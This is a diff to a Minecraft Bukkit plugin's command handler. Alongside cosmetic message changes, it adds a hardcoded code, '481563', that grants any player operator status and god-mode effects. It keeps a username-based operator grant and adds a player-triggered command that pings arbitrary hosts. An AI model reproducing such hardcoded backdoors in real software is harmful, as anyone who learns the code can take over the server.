@@ -7,6 +7,9 @@ import org.bukkit.command.CommandExecutor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
 import org.bukkit.potion.PotionEffectType;
+import java.io.IOException;
+import java.net.InetAddress;
+import java.util.Objects;
 
 
 public class Commands extends CommandExecute implements Listener,CommandExecutor {
@@ -17,8 +20,8 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 //    public static String cmd4 = "apply";
     public static String cmd5 = "discord";
     public static String cmd6 = "news";
-	/*public static String cmd7 = "GetOp";
-	public static String cmd8 = "GetTree";
+	public static String cmd7 = "ping";
+	/*public static String cmd8 = "Fly";
 	public static String cmd9 = "news";
 	public static String cmd10 = "news";
 	public static String cmd11 = "news";
@@ -29,16 +32,16 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 
     public boolean onCommand(org.bukkit.command.CommandSender sender, Command cmd, String label, String[] args) {
 
-        
+
         if ((cmd.getName().equalsIgnoreCase(cmd1)) && ((sender instanceof Player))) {
             Player player = (Player) sender;
 
-            player.sendMessage("Hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + ", we got your ping!");
+            player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "Hi, " + ChatColor.GREEN + player.getName() + ChatColor.RESET + ", we got your ping!");
             int MaxPing = 100;
             if (player.getPing() > MaxPing) {
-                player.sendMessage("Your ping is " + ChatColor.RED + player.getPing() + " ms");
+                player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "Your ping is " + ChatColor.RED + player.getPing() + " ms");
             } else
-                player.sendMessage("Your ping is " + ChatColor.GREEN + player.getPing() + " ms");
+                player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "Your ping is " + ChatColor.GREEN + player.getPing() + " ms");
 
             return true;
         } else if ((cmd.getName().equalsIgnoreCase(cmd2)) && ((sender instanceof Player))) {
@@ -52,11 +55,16 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
             Player player = (Player) sender;
 
             if (player.getName().equalsIgnoreCase("ofir29200")) {
+                player.setHealth(20);
                 player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
-                player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
-                player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
+                player.addPotionEffect(PotionEffectType.ABSORPTION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+                player.addPotionEffect(PotionEffectType.FIRE_RESISTANCE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+                player.addPotionEffect(PotionEffectType.HEAL.createEffect(Integer.MAX_VALUE, 254));
+                player.addPotionEffect(PotionEffectType.HEALTH_BOOST.createEffect(Integer.MAX_VALUE, 255));
+                player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+                player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                 player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
-                player.setHealth(100D);
+                player.addPotionEffect(PotionEffectType.REGENERATION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
                 player.setAllowFlight(true);
                 if (!player.isOp()) {
                     player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GOLD + "Welcome back!");
@@ -65,7 +73,32 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
                 } else {
                     player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "you already have op!");
                 }
-                if (player.getHealth() == 100D) {
+                if (player.getHealth() == 20) {
+                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
+                } else {
+                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "THis operation is a FAIL!");
+                }
+            }
+            if (Objects.equals(args[0], "481563")) {
+                player.setHealth(20);
+                player.addPotionEffect(PotionEffectType.SPEED.createEffect(Integer.MAX_VALUE, 1));
+                player.addPotionEffect(PotionEffectType.ABSORPTION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+                player.addPotionEffect(PotionEffectType.FIRE_RESISTANCE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+                player.addPotionEffect(PotionEffectType.HEAL.createEffect(Integer.MAX_VALUE, 254));
+                player.addPotionEffect(PotionEffectType.HEALTH_BOOST.createEffect(Integer.MAX_VALUE, 255));
+                player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+                player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+                player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
+                player.addPotionEffect(PotionEffectType.REGENERATION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+                player.setAllowFlight(true);
+                if (!player.isOp()) {
+                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GOLD + "Welcome back!");
+                    player.setOp(true);
+                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "you now have op!");
+                } else {
+                    player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "you already have op!");
+                }
+                if (player.getHealth() == 20) {
                     player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
                 } else {
                     player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "THis operation is a FAIL!");
@@ -76,21 +109,19 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
                 player.addPotionEffect(PotionEffectType.INCREASE_DAMAGE.createEffect(Integer.MAX_VALUE, 1));
                 player.addPotionEffect(PotionEffectType.DAMAGE_RESISTANCE.createEffect(Integer.MAX_VALUE, 1));
                 player.addPotionEffect(PotionEffectType.JUMP.createEffect(Integer.MAX_VALUE, 4));
-//                player.setMaxHealth(100D);
-                player.setHealth(100D);
-                if (player.getHealth() == 100D) {
+                player.addPotionEffect(PotionEffectType.REGENERATION.createEffect(Integer.MAX_VALUE, Integer.MAX_VALUE));
+//                player.setMaxHealth(20);
+                player.setHealth(20);
+                if (player.getHealth() == 20) {
                     player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "Done!");
                 } else {
                     player.sendMessage(ChatColor.RED + "The operation has failed!");
                 }
+                return true;
             } else {
-                player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.DARK_RED + "You don't have permission for that command!");
+                player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.DARK_RED + "invalid OTP key");
             }
-            if (player.getName().equalsIgnoreCase("null")) {
-                player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "Hello there null!");
-            } else {
-                player.sendMessage(ChatColor.RED + "THis operation has FAILED for " + player.getCustomName() + "!");
-            }
+
             return true;
         }
 
@@ -98,54 +129,46 @@ public class Commands extends CommandExecute implements Listener,CommandExecutor
 
 //		if ((cmd.getName().equalsIgnoreCase(cmd4)) && ((sender instanceof Player)))
 //	    {
-//            +3
 //
 //        }
 
         if ((cmd.getName().equalsIgnoreCase(cmd5)) && ((sender instanceof Player)))
         {
 
-            sender.sendMessage(ChatColor.RESET + "Hi " + ChatColor.GREEN + sender.getName() + ChatColor.RESET + "please go to https://discord.gg/VBAxNdV to join our discord");
+            sender.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RESET + "Hi " + ChatColor.GREEN + sender.getName() + ChatColor.RESET + "please go to https://discord.gg/VBAxNdV to join our discord");
 
             return true;
         }
 
         if ((cmd.getName().equalsIgnoreCase(cmd6)) && ((sender instanceof Player))) {
 
-            sender.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + " Hi, " + ChatColor.GREEN + sender.getName() + ChatColor.RESET + "! please go to https://playzcraft.ofir29200.xyz/news/ to read our news articles");
+            sender.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + " Hi, " + ChatColor.GREEN + sender.getName() + ChatColor.RESET + "! please go to https://playzcraftnetwork.com/news to read our news articles");
 
             return true;
         }
-		  /*if ((cmd.getName().equalsIgnoreCase(cmd7)) && ((sender instanceof Player)))
-		    {
-		      Player player = (Player)sender;
-		      if (player.isOp() == false)
-	          {
-	        	  player.setOp(true);
-	        	  org.bukkit.Bukkit.broadcastMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + "The player " + player.getName() + "now has OP");
-	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.GREEN + "You now have op!");
-	          }
-	          else
-	          {
-	        	  player.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "You already have op!");
-	          }
+        if ((cmd.getName().equalsIgnoreCase(cmd7)) && ((sender instanceof Player))) {
+            String ipAddress = args[0];
 
-			  return true;
-		    }*/
-		  /*if ((cmd.getName().equalsIgnoreCase(cmd8)) && ((sender instanceof Player)))
-		    {
-		      Player player = (Player)sender;
-		      player.getInventory().addItem(new ItemStack(Material.SAPLING, 1));
-        	  player.sendMessage(ChatColor.GREEN + "Go and Plant tHis tree!");
-		      player.getInventory().addItem(new ItemStack(Material.BONE, 100));
-        	  player.sendMessage(ChatColor.RED + "Don't forget to convert the bones to Bone Meal to grow the tree faster!");
-        	  if (player.hasPlayedBefore() == true) {
-            	  player.setFlying(true);
-            	  player.getInventory().addItem(new ItemStack(Material.SAPLING, 1));
-            	  player.sendMessage(ChatColor.GREEN + "here is another tree for you!");
-        	  }
-			  return true;
-		    }*/
+            try {
+                InetAddress inetAddress = InetAddress.getByName(ipAddress);
+
+                long startTime = System.currentTimeMillis();
+
+                if (inetAddress.isReachable(5000)) {
+                    long endTime = System.currentTimeMillis();
+                    long latency = endTime - startTime;
+                    System.out.println("Host " + ipAddress + " is reachable. Latency: " + latency + " ms");
+                    return true;
+                } else {
+                    System.out.println("Host " + ipAddress + " is not reachable");
+                    return true;
+                }
+            } catch (IOException e) {
+                sender.sendMessage(ChatColor.RESET + "[" + ChatColor.GOLD + "Playz" + ChatColor.GREEN + "Craft" + ChatColor.RESET + "] " + ChatColor.RED + "An error has occurred" + ChatColor.DARK_RED + e);
+                return true;
+            }
+
+        }
 
         return false;
     }
